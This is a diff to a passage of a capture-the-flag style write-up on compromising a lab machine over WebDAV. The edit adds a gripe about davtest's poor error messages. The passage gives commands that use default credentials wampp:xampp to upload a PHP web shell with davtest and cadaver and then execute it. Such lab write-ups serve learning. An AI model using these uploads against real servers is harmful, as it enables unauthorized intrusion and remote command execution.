@@ -73,7 +73,9 @@ Executes: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.php
 
 So, I can upload files and I can upload PHP files, which are fully executable. I downloaded a copy of https://github.com/flozz/p0wny-shell/blob/master/shell.php and got to work.
 
-Surprisingly, `davtest` despite having an `uploadfile` arg and showing in the above test it could upload, wasn't working. I tried this: `davtest -url http://10.10.119.10/webdav -auth wampp:xampp -uploadfile shell.php -uploadloc http://10.10.119.10/webdav/shell.php` and it failed. After I rooted the machine later (while writing this) I did more investigation: the latter path is relative to the dir so this would have worked: `davtest -url http://10.10.119.10/webdav -auth wampp:xampp -uploadfile shell.php -uploadloc shell.php`. Obvious really.
+Surprisingly, `davtest` despite having an `uploadfile` arg and showing in the above test it could upload, wasn't working. I tried this: `davtest -url http://10.10.119.10/webdav -auth wampp:xampp -uploadfile shell.php -uploadloc http://10.10.119.10/webdav/shell.php` and it failed with no diagnostic error. I switched away largely because the errors were done (just said FAILED, come on devs). 
+
+    > After I rooted the machine later (while writing this) I did more investigation: the latter path is relative to the dir so this would have worked: "davtest -url http://10.10.119.10/webdav -auth wampp:xampp -uploadfile shell.php -uploadloc shell.php". Obvious really. Still needs better error messages, or help that says something like "upload path RELATIVE to webdav root".
 
 Instead, I used `cadaver http://10.10.119.10/webdav` which provides an FTP like experience. I used that to upload the shell via `put shell.php`. Navigated to `http://10.10.119.10/webdav/shell.php` and it loaded up nicely.
 
